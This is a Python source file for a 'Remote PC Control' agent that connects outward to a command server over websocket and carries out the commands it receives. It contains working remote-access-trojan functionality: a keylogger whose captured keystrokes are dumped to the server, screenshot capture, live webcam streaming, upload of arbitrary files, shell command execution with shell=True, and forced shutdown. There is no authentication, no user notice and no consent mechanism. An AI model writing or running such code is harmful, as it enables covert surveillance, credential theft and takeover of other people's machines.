#!/usr/bin/env python3
"""
Remote PC Control - Agent
Runs on each controlled machine. Connects outward to the central server.
"""

import asyncio
import websockets
import json
import base64
import socket
import psutil
import subprocess
import threading
import os
import io

# ── Config ────────────────────────────────────────────────────────────────────
SERVER_URL = os.environ.get("SERVER_URL", "ws://localhost:3000")
MACHINE_ID = socket.gethostname()

# ── Keylogger state ───────────────────────────────────────────────────────────
_keylog_buffer = []
_keylog_listener = None
_keylog_lock = threading.Lock()

# ── Webcam state ──────────────────────────────────────────────────────────────
_webcam_active = False


# ─── Screenshot ───────────────────────────────────────────────────────────────
def take_screenshot():
    try:
        import mss
        with mss.mss() as sct:
            monitor = sct.monitors[1]           # primary monitor
            shot = sct.grab(monitor)
            from PIL import Image
            img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=55)
            return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return None


# ─── Keylogger ────────────────────────────────────────────────────────────────
def _on_press(key):
    try:
        char = key.char if key.char else f"[{key.name}]"
    except AttributeError:
        char = f"[{key.name}]"
    with _keylog_lock:
        _keylog_buffer.append(char)


def start_keylog():
    global _keylog_listener
    if _keylog_listener is not None:
        return "Keylogger already running"
    from pynput import keyboard
    _keylog_listener = keyboard.Listener(on_press=_on_press)
    _keylog_listener.start()
    return "Keylogger started"


def stop_keylog():
    global _keylog_listener
    if _keylog_listener:
        _keylog_listener.stop()
        _keylog_listener = None
    return "Keylogger stopped"


def dump_keylog():
    with _keylog_lock:
        data = "".join(_keylog_buffer)
        _keylog_buffer.clear()
    return data


# ─── Processes (all) ──────────────────────────────────────────────────────────
def list_processes():
    result = []
    for p in psutil.process_iter(["pid", "name", "status", "cpu_percent", "memory_percent"]):
        try:
            result.append({
                "pid":    p.info["pid"],
                "name":   p.info["name"] or "",
                "status": p.info["status"] or "",
                "cpu":    round(p.info["cpu_percent"] or 0, 1),
                "mem":    round(p.info["memory_percent"] or 0, 1),
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return result


def kill_process(pid):
    try:
        p = psutil.Process(int(pid))
        p.terminate()
        return f"Process {pid} ({p.name()}) terminated"
    except Exception as e:
        return f"Error: {e}"


def start_process(name):
    try:
        subprocess.Popen(name, shell=True, start_new_session=True)
        return f"Started: {name}"
    except Exception as e:
        return f"Error: {e}"


# ─── Applications (windowed, via wmctrl) ──────────────────────────────────────
def list_apps():
    try:
        out = subprocess.check_output(["wmctrl", "-l", "-p"], text=True, timeout=3)
        apps = []
        for line in out.strip().splitlines():
            parts = line.split(None, 4)
            if len(parts) >= 5:
                wid, desktop, pid, host, title = parts
                if desktop != "-1":          # skip hidden windows
                    apps.append({"pid": int(pid), "title": title, "wid": wid})
        return apps
    except FileNotFoundError:
        # fallback: user-space processes with visible names
        apps = []
        for p in psutil.process_iter(["pid", "name", "username"]):
            try:
                if p.info["username"] and not p.info["name"].endswith("d"):
                    apps.append({"pid": p.info["pid"], "title": p.info["name"], "wid": ""})
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return apps[:50]
    except Exception as e:
        return []


# ─── File download ────────────────────────────────────────────────────────────
def download_file(path):
    try:
        with open(path, "rb") as f:
            raw = f.read()
        return {
            "name": os.path.basename(path),
            "size": len(raw),
            "data": base64.b64encode(raw).decode(),
        }
    except Exception as e:
        return {"error": str(e)}


# ─── Webcam ───────────────────────────────────────────────────────────────────
async def webcam_loop(ws):
    global _webcam_active
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ws.send(json.dumps({
                "type": "response", "id": MACHINE_ID,
                "action": "webcam_frame", "error": "No webcam found"
            }))
            _webcam_active = False
            return
        while _webcam_active:
            ret, frame = cap.read()
            if not ret:
                break
            _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
            b64 = base64.b64encode(buf).decode()
            await ws.send(json.dumps({
                "type": "response", "id": MACHINE_ID,
                "action": "webcam_frame", "data": b64
            }))
            await asyncio.sleep(0.1)        # ~10 fps
        cap.release()
    except Exception as e:
        await ws.send(json.dumps({
            "type": "response", "id": MACHINE_ID,
            "action": "webcam_frame", "error": str(e)
        }))
    finally:
        _webcam_active = False


# ─── Shutdown / Reboot ────────────────────────────────────────────────────────
def do_shutdown():
    subprocess.Popen(["shutdown", "-h", "now"])
    return "Shutting down…"


def do_reboot():
    subprocess.Popen(["reboot"])
    return "Rebooting…"


# ─── Command dispatcher ───────────────────────────────────────────────────────
async def dispatch(ws, msg):
    global _webcam_active
    action = msg.get("action", "")
    resp = {"type": "response", "id": MACHINE_ID, "action": action}

    if action == "screenshot":
        data = take_screenshot()
        if data:
            resp["data"] = data
        else:
            resp["error"] = "Screenshot failed (is a display available?)"

    elif action == "list_processes":
        resp["data"] = list_processes()

    elif action == "kill_process":
        resp["data"] = kill_process(msg.get("pid"))

    elif action == "start_process":
        resp["data"] = start_process(msg.get("name", ""))

    elif action == "list_apps":
        resp["data"] = list_apps()

    elif action == "kill_app":
        resp["data"] = kill_process(msg.get("pid"))

    elif action == "start_app":
        resp["data"] = start_process(msg.get("name", ""))

    elif action == "keylog_start":
        resp["data"] = start_keylog()

    elif action == "keylog_stop":
        resp["data"] = stop_keylog()

    elif action == "keylog_dump":
        resp["data"] = dump_keylog()

    elif action == "download_file":
        result = download_file(msg.get("path", ""))
        if "error" in result:
            resp["error"] = result["error"]
        else:
            resp["data"] = result

    elif action == "webcam_start":
        if not _webcam_active:
            _webcam_active = True
            asyncio.create_task(webcam_loop(ws))
        resp["data"] = "Webcam started"

    elif action == "webcam_stop":
        _webcam_active = False
        resp["data"] = "Webcam stopped"

    elif action == "shutdown":
        resp["data"] = do_shutdown()

    elif action == "reboot":
        resp["data"] = do_reboot()

    else:
        resp["error"] = f"Unknown action: {action}"

    # webcam frames are sent asynchronously from webcam_loop, skip initial ack
    if action != "webcam_start":
        await ws.send(json.dumps(resp))


# ─── Main loop ────────────────────────────────────────────────────────────────
async def run():
    registration = json.dumps({"role": "agent", "type": "register", "id": MACHINE_ID})
    while True:
        try:
            print(f"[agent] Connecting to {SERVER_URL} as '{MACHINE_ID}' …")
            async with websockets.connect(SERVER_URL, ping_interval=20, ping_timeout=10) as ws:
                await ws.send(registration)
                print(f"[agent] Connected.")
                async for raw in ws:
                    try:
                        msg = json.loads(raw)
                        await dispatch(ws, msg)
                    except Exception as e:
                        print(f"[agent] Error handling message: {e}")
        except Exception as e:
            print(f"[agent] Connection lost ({e}). Retrying in 3 s…")
            await asyncio.sleep(3)


if __name__ == "__main__":
    asyncio.run(run())
